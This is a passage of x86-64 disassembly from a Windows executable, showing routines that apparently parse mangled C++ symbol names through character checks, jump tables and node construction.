   140002643:	e8 38 f5 ff ff       	call   0x140001b80
   140002648:	85 c0                	test   %eax,%eax
   14000264a:	75 34                	jne    0x140002680
   14000264c:	41 0f be 00          	movsbl (%r8),%eax
   140002650:	3c 54                	cmp    $0x54,%al
   140002652:	0f 8f 38 01 00 00    	jg     0x140002790
   140002658:	3c 40                	cmp    $0x40,%al
   14000265a:	0f 8e d0 01 00 00    	jle    0x140002830
   140002660:	83 e8 41             	sub    $0x41,%eax
   140002663:	3c 13                	cmp    $0x13,%al
   140002665:	0f 87 c5 01 00 00    	ja     0x140002830
   14000266b:	48 8d 15 62 2d 02 00 	lea    0x22d62(%rip),%rdx        # 0x1400253d4
   140002672:	0f b6 c0             	movzbl %al,%eax
   140002675:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002679:	48 01 d0             	add    %rdx,%rax
   14000267c:	ff e0                	jmp    *%rax
   14000267e:	66 90                	xchg   %ax,%ax
   140002680:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002685:	45 31 c0             	xor    %r8d,%r8d
   140002688:	48 89 d9             	mov    %rbx,%rcx
   14000268b:	e8 c0 20 00 00       	call   0x140004750
   140002690:	48 89 c2             	mov    %rax,%rdx
   140002693:	48 85 c0             	test   %rax,%rax
   140002696:	0f 84 d4 00 00 00    	je     0x140002770
   14000269c:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400026a0:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   1400026a5:	48 89 d9             	mov    %rbx,%rcx
   1400026a8:	80 38 46             	cmpb   $0x46,(%rax)
   1400026ab:	0f 84 cf 00 00 00    	je     0x140002780
   1400026b1:	e8 7a ff ff ff       	call   0x140002630
   1400026b6:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400026bb:	48 89 02             	mov    %rax,(%rdx)
   1400026be:	48 85 c0             	test   %rax,%rax
   1400026c1:	0f 84 a9 00 00 00    	je     0x140002770
   1400026c7:	8b 08                	mov    (%rax),%ecx
   1400026c9:	83 e9 1f             	sub    $0x1f,%ecx
   1400026cc:	83 f9 01             	cmp    $0x1,%ecx
   1400026cf:	77 18                	ja     0x1400026e9
   1400026d1:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   1400026d6:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400026da:	4c 89 40 10          	mov    %r8,0x10(%rax)
   1400026de:	48 8b 02             	mov    (%rdx),%rax
   1400026e1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400026e6:	48 89 0a             	mov    %rcx,(%rdx)
   1400026e9:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400026ee:	4d 85 c9             	test   %r9,%r9
   1400026f1:	74 7d                	je     0x140002770
   1400026f3:	8b 43 38             	mov    0x38(%rbx),%eax
   1400026f6:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   1400026f9:	7d 75                	jge    0x140002770
   1400026fb:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   1400026ff:	48 63 c8             	movslq %eax,%rcx
   140002702:	83 c0 01             	add    $0x1,%eax
   140002705:	4c 89 0c ca          	mov    %r9,(%rdx,%rcx,8)
   140002709:	89 43 38             	mov    %eax,0x38(%rbx)
   14000270c:	4c 89 c8             	mov    %r9,%rax
   14000270f:	48 83 c4 58          	add    $0x58,%rsp
   140002713:	5b                   	pop    %rbx
   140002714:	5e                   	pop    %rsi
   140002715:	5f                   	pop    %rdi
   140002716:	41 5e                	pop    %r14
   140002718:	c3                   	ret
   140002719:	8b 53 4c             	mov    0x4c(%rbx),%edx
   14000271c:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   140002723:	48 89 d9             	mov    %rbx,%rcx
   140002726:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000272a:	e8 51 16 00 00       	call   0x140003d80
   14000272f:	8b 54 24 28          	mov    0x28(%rsp),%edx
   140002733:	45 31 c9             	xor    %r9d,%r9d
   140002736:	48 89 d9             	mov    %rbx,%rcx
   140002739:	49 89 c0             	mov    %rax,%r8
   14000273c:	89 53 4c             	mov    %edx,0x4c(%rbx)
   14000273f:	ba 45 00 00 00       	mov    $0x45,%edx
   140002744:	e8 f7 ed ff ff       	call   0x140001540
   140002749:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000274e:	49 89 c0             	mov    %rax,%r8
   140002751:	48 85 c0             	test   %rax,%rax
   140002754:	74 1a                	je     0x140002770
   140002756:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000275a:	80 38 00             	cmpb   $0x0,(%rax)
   14000275d:	74 11                	je     0x140002770
   14000275f:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002763:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002767:	80 38 45             	cmpb   $0x45,(%rax)
   14000276a:	0f 84 89 00 00 00    	je     0x1400027f9
   140002770:	45 31 c9             	xor    %r9d,%r9d
   140002773:	4c 89 c8             	mov    %r9,%rax
   140002776:	48 83 c4 58          	add    $0x58,%rsp
   14000277a:	5b                   	pop    %rbx
   14000277b:	5e                   	pop    %rsi
   14000277c:	5f                   	pop    %rdi
   14000277d:	41 5e                	pop    %r14
   14000277f:	c3                   	ret
   140002780:	e8 6b 0b 00 00       	call   0x1400032f0
   140002785:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   14000278a:	e9 2c ff ff ff       	jmp    0x1400026bb
   14000278f:	90                   	nop
   140002790:	8d 48 ab             	lea    -0x55(%rax),%ecx
   140002793:	80 f9 25             	cmp    $0x25,%cl
   140002796:	0f 87 94 00 00 00    	ja     0x140002830
   14000279c:	49 b9 00 f0 bf c7 3e 	movabs $0x3ec7bff000,%r9
   1400027a3:	00 00 00 
   1400027a6:	ba 01 00 00 00       	mov    $0x1,%edx
   1400027ab:	48 d3 e2             	shl    %cl,%rdx
   1400027ae:	4c 85 ca             	test   %r9,%rdx
   1400027b1:	0f 85 e9 07 00 00    	jne    0x140002fa0
   1400027b7:	83 e2 01             	and    $0x1,%edx
   1400027ba:	0f 85 90 07 00 00    	jne    0x140002f50
   1400027c0:	80 f9 20             	cmp    $0x20,%cl
   1400027c3:	75 6b                	jne    0x140002830
   1400027c5:	49 83 c0 01          	add    $0x1,%r8
   1400027c9:	48 89 d9             	mov    %rbx,%rcx
   1400027cc:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400027d0:	e8 2b fa ff ff       	call   0x140002200
   1400027d5:	45 31 c9             	xor    %r9d,%r9d
   1400027d8:	ba 29 00 00 00       	mov    $0x29,%edx
   1400027dd:	48 89 d9             	mov    %rbx,%rcx
   1400027e0:	49 89 c0             	mov    %rax,%r8
   1400027e3:	e8 58 ed ff ff       	call   0x140001540
   1400027e8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400027ed:	49 89 c0             	mov    %rax,%r8
   1400027f0:	4d 85 c0             	test   %r8,%r8
   1400027f3:	0f 84 77 ff ff ff    	je     0x140002770
   1400027f9:	8b 43 38             	mov    0x38(%rbx),%eax
   1400027fc:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   1400027ff:	0f 8d 6b ff ff ff    	jge    0x140002770
   140002805:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   140002809:	48 63 c8             	movslq %eax,%rcx
   14000280c:	83 c0 01             	add    $0x1,%eax
   14000280f:	4c 89 04 ca          	mov    %r8,(%rdx,%rcx,8)
   140002813:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140002818:	89 43 38             	mov    %eax,0x38(%rbx)
   14000281b:	4c 89 c8             	mov    %r9,%rax
   14000281e:	48 83 c4 58          	add    $0x58,%rsp
   140002822:	5b                   	pop    %rbx
   140002823:	5e                   	pop    %rsi
   140002824:	5f                   	pop    %rdi
   140002825:	41 5e                	pop    %r14
   140002827:	c3                   	ret
   140002828:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000282f:	00 
   140002830:	ba 01 00 00 00       	mov    $0x1,%edx
   140002835:	48 89 d9             	mov    %rbx,%rcx
   140002838:	48 83 c4 58          	add    $0x58,%rsp
   14000283c:	5b                   	pop    %rbx
   14000283d:	5e                   	pop    %rsi
   14000283e:	5f                   	pop    %rdi
   14000283f:	41 5e                	pop    %r14
   140002841:	e9 da 23 00 00       	jmp    0x140004c20
   140002846:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000284d:	00 00 00 
   140002850:	49 83 c0 01          	add    $0x1,%r8
   140002854:	48 89 d9             	mov    %rbx,%rcx
   140002857:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000285b:	e8 d0 fd ff ff       	call   0x140002630
   140002860:	45 31 c9             	xor    %r9d,%r9d
   140002863:	ba 26 00 00 00       	mov    $0x26,%edx
   140002868:	48 89 d9             	mov    %rbx,%rcx
   14000286b:	49 89 c0             	mov    %rax,%r8
   14000286e:	e8 cd ec ff ff       	call   0x140001540
   140002873:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002878:	49 89 c0             	mov    %rax,%r8
   14000287b:	e9 70 ff ff ff       	jmp    0x1400027f0
   140002880:	49 8d 40 01          	lea    0x1(%r8),%rax
   140002884:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002888:	41 80 78 01 00       	cmpb   $0x0,0x1(%r8)
   14000288d:	0f 84 dd fe ff ff    	je     0x140002770
   140002893:	49 8d 40 02          	lea    0x2(%r8),%rax
   140002897:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000289b:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   1400028a0:	83 e8 46             	sub    $0x46,%eax
   1400028a3:	3c 30                	cmp    $0x30,%al
   1400028a5:	0f 87 c5 fe ff ff    	ja     0x140002770
   1400028ab:	48 8d 15 72 2b 02 00 	lea    0x22b72(%rip),%rdx        # 0x140025424
   1400028b2:	0f b6 c0             	movzbl %al,%eax
   1400028b5:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   1400028b9:	48 01 d0             	add    %rdx,%rax
   1400028bc:	ff e0                	jmp    *%rax
   1400028be:	66 90                	xchg   %ax,%ax
   1400028c0:	48 89 d9             	mov    %rbx,%rcx
   1400028c3:	e8 28 0a 00 00       	call   0x1400032f0
   1400028c8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400028cd:	49 89 c0             	mov    %rax,%r8
   1400028d0:	e9 1b ff ff ff       	jmp    0x1400027f0
   1400028d5:	0f 1f 00             	nopl   (%rax)
   1400028d8:	49 83 c0 01          	add    $0x1,%r8
   1400028dc:	48 89 d9             	mov    %rbx,%rcx
   1400028df:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   1400028e3:	e8 48 fd ff ff       	call   0x140002630
   1400028e8:	45 31 c9             	xor    %r9d,%r9d
   1400028eb:	ba 27 00 00 00       	mov    $0x27,%edx
   1400028f0:	48 89 d9             	mov    %rbx,%rcx
   1400028f3:	49 89 c0             	mov    %rax,%r8
   1400028f6:	e8 45 ec ff ff       	call   0x140001540
   1400028fb:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002900:	49 89 c0             	mov    %rax,%r8
   140002903:	e9 e8 fe ff ff       	jmp    0x1400027f0
   140002908:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000290f:	00 
   140002910:	49 83 c0 01          	add    $0x1,%r8
   140002914:	48 89 d9             	mov    %rbx,%rcx
   140002917:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000291b:	e8 10 fd ff ff       	call   0x140002630
   140002920:	45 31 c9             	xor    %r9d,%r9d
   140002923:	ba 25 00 00 00       	mov    $0x25,%edx
   140002928:	48 89 d9             	mov    %rbx,%rcx
   14000292b:	49 89 c0             	mov    %rax,%r8
   14000292e:	e8 0d ec ff ff       	call   0x140001540
   140002933:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002938:	49 89 c0             	mov    %rax,%r8
   14000293b:	e9 b0 fe ff ff       	jmp    0x1400027f0
   140002940:	49 83 c0 01          	add    $0x1,%r8
   140002944:	48 89 d9             	mov    %rbx,%rcx
   140002947:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000294b:	e8 e0 fc ff ff       	call   0x140002630
   140002950:	45 31 c9             	xor    %r9d,%r9d
   140002953:	ba 23 00 00 00       	mov    $0x23,%edx
   140002958:	48 89 d9             	mov    %rbx,%rcx
   14000295b:	49 89 c0             	mov    %rax,%r8
   14000295e:	e8 dd eb ff ff       	call   0x140001540
   140002963:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002968:	49 89 c0             	mov    %rax,%r8
   14000296b:	e9 80 fe ff ff       	jmp    0x1400027f0
   140002970:	49 83 c0 01          	add    $0x1,%r8
   140002974:	48 89 d9             	mov    %rbx,%rcx
   140002977:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000297b:	e8 b0 fc ff ff       	call   0x140002630
   140002980:	45 31 c9             	xor    %r9d,%r9d
   140002983:	ba 24 00 00 00       	mov    $0x24,%edx
   140002988:	48 89 d9             	mov    %rbx,%rcx
   14000298b:	49 89 c0             	mov    %rax,%r8
   14000298e:	e8 ad eb ff ff       	call   0x140001540
   140002993:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002998:	49 89 c0             	mov    %rax,%r8
   14000299b:	e9 50 fe ff ff       	jmp    0x1400027f0
   1400029a0:	48 89 d9             	mov    %rbx,%rcx
   1400029a3:	e8 e8 f4 ff ff       	call   0x140001e90
   1400029a8:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400029ac:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400029b1:	49 89 c0             	mov    %rax,%r8
   1400029b4:	80 3a 49             	cmpb   $0x49,(%rdx)
   1400029b7:	0f 85 33 fe ff ff    	jne    0x1400027f0
   1400029bd:	44 8b 5b 50          	mov    0x50(%rbx),%r11d
   1400029c1:	45 85 db             	test   %r11d,%r11d
   1400029c4:	0f 85 9f 06 00 00    	jne    0x140003069
   1400029ca:	48 85 c0             	test   %rax,%rax
   1400029cd:	0f 84 9d fd ff ff    	je     0x140002770
   1400029d3:	8b 43 38             	mov    0x38(%rbx),%eax
   1400029d6:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   1400029d9:	0f 8d 91 fd ff ff    	jge    0x140002770
   1400029df:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400029e3:	4c 63 c8             	movslq %eax,%r9
   1400029e6:	83 c0 01             	add    $0x1,%eax
   1400029e9:	4e 89 04 c9          	mov    %r8,(%rcx,%r9,8)
   1400029ed:	45 31 c9             	xor    %r9d,%r9d
   1400029f0:	89 43 38             	mov    %eax,0x38(%rbx)
   1400029f3:	0f b6 02             	movzbl (%rdx),%eax
   1400029f6:	8d 48 b7             	lea    -0x49(%rax),%ecx
   1400029f9:	80 f9 01             	cmp    $0x1,%cl
   1400029fc:	77 1d                	ja     0x140002a1b
   1400029fe:	48 83 c2 01          	add    $0x1,%rdx
   140002a02:	48 89 d9             	mov    %rbx,%rcx
   140002a05:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002a0a:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002a0e:	e8 6d 1f 00 00       	call   0x140004980
   140002a13:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002a18:	49 89 c1             	mov    %rax,%r9
   140002a1b:	ba 04 00 00 00       	mov    $0x4,%edx
   140002a20:	48 89 d9             	mov    %rbx,%rcx
   140002a23:	e8 18 eb ff ff       	call   0x140001540
   140002a28:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002a2d:	49 89 c0             	mov    %rax,%r8
   140002a30:	e9 bb fd ff ff       	jmp    0x1400027f0
   140002a35:	0f 1f 00             	nopl   (%rax)
   140002a38:	49 8d 50 01          	lea    0x1(%r8),%rdx
   140002a3c:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002a40:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   140002a45:	3c 5f                	cmp    $0x5f,%al
   140002a47:	0f 84 b3 05 00 00    	je     0x140003000
   140002a4d:	83 e8 30             	sub    $0x30,%eax
   140002a50:	3c 09                	cmp    $0x9,%al
   140002a52:	0f 87 db 05 00 00    	ja     0x140003033
   140002a58:	49 89 d2             	mov    %rdx,%r10
   140002a5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a60:	4d 89 d3             	mov    %r10,%r11
   140002a63:	49 83 c2 01          	add    $0x1,%r10
   140002a67:	4c 89 53 18          	mov    %r10,0x18(%rbx)
   140002a6b:	41 0f b6 02          	movzbl (%r10),%eax
   140002a6f:	83 e8 30             	sub    $0x30,%eax
   140002a72:	3c 09                	cmp    $0x9,%al
   140002a74:	76 ea                	jbe    0x140002a60
   140002a76:	44 89 d8             	mov    %r11d,%eax
   140002a79:	48 89 d9             	mov    %rbx,%rcx
   140002a7c:	44 29 c0             	sub    %r8d,%eax
   140002a7f:	41 89 c0             	mov    %eax,%r8d
   140002a82:	e8 b9 eb ff ff       	call   0x140001640
   140002a87:	49 89 c0             	mov    %rax,%r8
   140002a8a:	48 85 c0             	test   %rax,%rax
   140002a8d:	0f 84 dd fc ff ff    	je     0x140002770
   140002a93:	41 0f b6 43 01       	movzbl 0x1(%r11),%eax
   140002a98:	4c 89 d2             	mov    %r10,%rdx
   140002a9b:	3c 5f                	cmp    $0x5f,%al
   140002a9d:	0f 85 cd fc ff ff    	jne    0x140002770
   140002aa3:	48 83 c2 01          	add    $0x1,%rdx
   140002aa7:	48 89 d9             	mov    %rbx,%rcx
   140002aaa:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002aaf:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002ab3:	e8 78 fb ff ff       	call   0x140002630
   140002ab8:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002abd:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140002ac2:	48 89 d9             	mov    %rbx,%rcx
   140002ac5:	49 89 c1             	mov    %rax,%r9
   140002ac8:	e8 73 ea ff ff       	call   0x140001540
   140002acd:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002ad2:	49 89 c0             	mov    %rax,%r8
   140002ad5:	e9 16 fd ff ff       	jmp    0x1400027f0
   140002ada:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002ae0:	49 83 c0 01          	add    $0x1,%r8
   140002ae4:	48 89 d9             	mov    %rbx,%rcx
   140002ae7:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140002aeb:	e8 40 fb ff ff       	call   0x140002630
   140002af0:	48 85 c0             	test   %rax,%rax
   140002af3:	0f 84 77 fc ff ff    	je     0x140002770
   140002af9:	48 89 d9             	mov    %rbx,%rcx
   140002afc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002b01:	e8 2a fb ff ff       	call   0x140002630
   140002b06:	49 89 c1             	mov    %rax,%r9
   140002b09:	48 85 c0             	test   %rax,%rax
   140002b0c:	0f 84 5e fc ff ff    	je     0x140002770
   140002b12:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002b17:	ba 2c 00 00 00       	mov    $0x2c,%edx
   140002b1c:	48 89 d9             	mov    %rbx,%rcx
   140002b1f:	e8 1c ea ff ff       	call   0x140001540
   140002b24:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002b29:	49 89 c0             	mov    %rax,%r8
   140002b2c:	e9 bf fc ff ff       	jmp    0x1400027f0
   140002b31:	48 89 d9             	mov    %rbx,%rcx
   140002b34:	e8 67 eb ff ff       	call   0x1400016a0
   140002b39:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002b3d:	41 89 c0             	mov    %eax,%r8d
   140002b40:	44 0f b6 12          	movzbl (%rdx),%r10d
   140002b44:	41 80 fa 62          	cmp    $0x62,%r10b
   140002b48:	0f 84 93 05 00 00    	je     0x1400030e1
   140002b4e:	41 80 fa 78          	cmp    $0x78,%r10b
   140002b52:	74 0d                	je     0x140002b61
   140002b54:	41 80 fa 5f          	cmp    $0x5f,%r10b
   140002b58:	0f 85 12 fc ff ff    	jne    0x140002770
   140002b5e:	45 31 d2             	xor    %r10d,%r10d
   140002b61:	8b 43 28             	mov    0x28(%rbx),%eax
   140002b64:	48 83 c2 01          	add    $0x1,%rdx
   140002b68:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002b6b:	0f 8d ef 03 02 00    	jge    0x140022f60
   140002b71:	48 63 c8             	movslq %eax,%rcx
   140002b74:	45 31 c9             	xor    %r9d,%r9d
   140002b77:	83 c0 01             	add    $0x1,%eax
   140002b7a:	44 88 54 24 3f       	mov    %r10b,0x3f(%rsp)
   140002b7f:	48 c1 e1 05          	shl    $0x5,%rcx
   140002b83:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002b87:	4c 89 49 04          	mov    %r9,0x4(%rcx)
   140002b8b:	89 43 28             	mov    %eax,0x28(%rbx)
   140002b8e:	48 8d 05 6b 42 02 00 	lea    0x2426b(%rip),%rax        # 0x140026e00
   140002b95:	66 44 89 41 18       	mov    %r8w,0x18(%rcx)
   140002b9a:	44 88 51 1a          	mov    %r10b,0x1a(%rcx)
   140002b9e:	c7 01 5f 00 00 00    	movl   $0x5f,(%rcx)
   140002ba4:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002ba8:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140002bac:	48 8d 15 e9 27 02 00 	lea    0x227e9(%rip),%rdx        # 0x14002539c
   140002bb3:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002bb8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002bbd:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002bc2:	e8 49 c6 00 00       	call   0x14000f210
   140002bc7:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002bcc:	e8 af c7 00 00       	call   0x14000f380
   140002bd1:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   140002bd6:	48 89 c2             	mov    %rax,%rdx
   140002bd9:	8b 43 48             	mov    0x48(%rbx),%eax
   140002bdc:	49 8b 49 10          	mov    0x10(%r9),%rcx
   140002be0:	03 41 08             	add    0x8(%rcx),%eax
   140002be3:	80 7c 24 3f 01       	cmpb   $0x1,0x3f(%rsp)
   140002be8:	83 d8 ff             	sbb    $0xffffffff,%eax
   140002beb:	01 d0                	add    %edx,%eax
   140002bed:	89 43 48             	mov    %eax,0x48(%rbx)
   140002bf0:	e9 7e fb ff ff       	jmp    0x140002773
   140002bf5:	8b 43 28             	mov    0x28(%rbx),%eax
   140002bf8:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002bfb:	0f 8d 6f fb ff ff    	jge    0x140002770
   140002c01:	48 63 c8             	movslq %eax,%rcx
   140002c04:	83 c0 01             	add    $0x1,%eax
   140002c07:	89 43 28             	mov    %eax,0x28(%rbx)
   140002c0a:	48 c1 e1 05          	shl    $0x5,%rcx
   140002c0e:	48 8d 05 af 27 02 00 	lea    0x227af(%rip),%rax        # 0x1400253c4
   140002c15:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002c19:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002c20:	00 
   140002c21:	49 89 c9             	mov    %rcx,%r9
   140002c24:	c7 01 00 00 00 00    	movl   $0x0,(%rcx)
   140002c2a:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002c2e:	c7 41 18 0e 00 00 00 	movl   $0xe,0x18(%rcx)
   140002c35:	e9 39 fb ff ff       	jmp    0x140002773
   140002c3a:	41 80 78 02 5f       	cmpb   $0x5f,0x2(%r8)
   140002c3f:	0f 84 f0 04 00 00    	je     0x140003135
   140002c45:	8b 43 28             	mov    0x28(%rbx),%eax
   140002c48:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002c4b:	0f 8d 1f fb ff ff    	jge    0x140002770
   140002c51:	4c 63 c0             	movslq %eax,%r8
   140002c54:	83 c0 01             	add    $0x1,%eax
   140002c57:	48 89 d9             	mov    %rbx,%rcx
   140002c5a:	49 c1 e0 05          	shl    $0x5,%r8
   140002c5e:	4c 03 43 20          	add    0x20(%rbx),%r8
   140002c62:	49 c7 40 04 00 00 00 	movq   $0x0,0x4(%r8)
   140002c69:	00 
   140002c6a:	89 43 28             	mov    %eax,0x28(%rbx)
   140002c6d:	41 c7 00 44 00 00 00 	movl   $0x44,(%r8)
   140002c74:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002c79:	e8 22 ea ff ff       	call   0x1400016a0
   140002c7e:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002c83:	41 89 40 10          	mov    %eax,0x10(%r8)
   140002c87:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002c8b:	80 38 5f             	cmpb   $0x5f,(%rax)
   140002c8e:	0f 85 dc fa ff ff    	jne    0x140002770
   140002c94:	48 83 c0 01          	add    $0x1,%rax
   140002c98:	48 89 d9             	mov    %rbx,%rcx
   140002c9b:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002ca0:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140002ca4:	e8 87 f9 ff ff       	call   0x140002630
   140002ca9:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002cae:	ba 2e 00 00 00       	mov    $0x2e,%edx
   140002cb3:	48 89 d9             	mov    %rbx,%rcx
   140002cb6:	49 89 c1             	mov    %rax,%r9
   140002cb9:	e8 82 e8 ff ff       	call   0x140001540
   140002cbe:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002cc3:	49 89 c0             	mov    %rax,%r8
   140002cc6:	e9 25 fb ff ff       	jmp    0x1400027f0
   140002ccb:	8b 43 28             	mov    0x28(%rbx),%eax
   140002cce:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002cd1:	0f 8d 9e 02 02 00    	jge    0x140022f75
   140002cd7:	48 63 c8             	movslq %eax,%rcx
   140002cda:	83 c0 01             	add    $0x1,%eax
   140002cdd:	48 c1 e1 05          	shl    $0x5,%rcx
   140002ce1:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002ce5:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002cec:	00 
   140002ced:	49 89 c9             	mov    %rcx,%r9
   140002cf0:	89 43 28             	mov    %eax,0x28(%rbx)
   140002cf3:	48 8d 05 86 40 02 00 	lea    0x24086(%rip),%rax        # 0x140026d80
   140002cfa:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002d00:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002d04:	83 43 48 07          	addl   $0x7,0x48(%rbx)
   140002d08:	e9 66 fa ff ff       	jmp    0x140002773
   140002d0d:	8b 43 28             	mov    0x28(%rbx),%eax
   140002d10:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002d13:	0f 8d 5c 02 02 00    	jge    0x140022f75
   140002d19:	48 63 c8             	movslq %eax,%rcx
   140002d1c:	83 c0 01             	add    $0x1,%eax
   140002d1f:	48 c1 e1 05          	shl    $0x5,%rcx
   140002d23:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002d27:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002d2e:	00 
   140002d2f:	49 89 c9             	mov    %rcx,%r9
   140002d32:	89 43 28             	mov    %eax,0x28(%rbx)
   140002d35:	48 8d 05 64 40 02 00 	lea    0x24064(%rip),%rax        # 0x140026da0
   140002d3c:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002d42:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002d46:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   140002d4a:	e9 24 fa ff ff       	jmp    0x140002773
   140002d4f:	8b 43 28             	mov    0x28(%rbx),%eax
   140002d52:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002d55:	0f 8d 1a 02 02 00    	jge    0x140022f75
   140002d5b:	48 63 c8             	movslq %eax,%rcx
   140002d5e:	83 c0 01             	add    $0x1,%eax
   140002d61:	48 c1 e1 05          	shl    $0x5,%rcx
   140002d65:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002d69:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002d70:	00 
   140002d71:	49 89 c9             	mov    %rcx,%r9
   140002d74:	89 43 28             	mov    %eax,0x28(%rbx)
   140002d77:	48 8d 05 e2 3f 02 00 	lea    0x23fe2(%rip),%rax        # 0x140026d60
   140002d7e:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002d84:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002d88:	83 43 48 04          	addl   $0x4,0x48(%rbx)
   140002d8c:	e9 e2 f9 ff ff       	jmp    0x140002773
   140002d91:	8b 43 28             	mov    0x28(%rbx),%eax
   140002d94:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002d97:	0f 8d d8 01 02 00    	jge    0x140022f75
   140002d9d:	48 63 c8             	movslq %eax,%rcx
   140002da0:	83 c0 01             	add    $0x1,%eax
   140002da3:	48 c1 e1 05          	shl    $0x5,%rcx
   140002da7:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002dab:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002db2:	00 
   140002db3:	49 89 c9             	mov    %rcx,%r9
   140002db6:	89 43 28             	mov    %eax,0x28(%rbx)
   140002db9:	48 8d 05 40 3f 02 00 	lea    0x23f40(%rip),%rax        # 0x140026d00
   140002dc0:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002dc6:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002dca:	83 43 48 09          	addl   $0x9,0x48(%rbx)
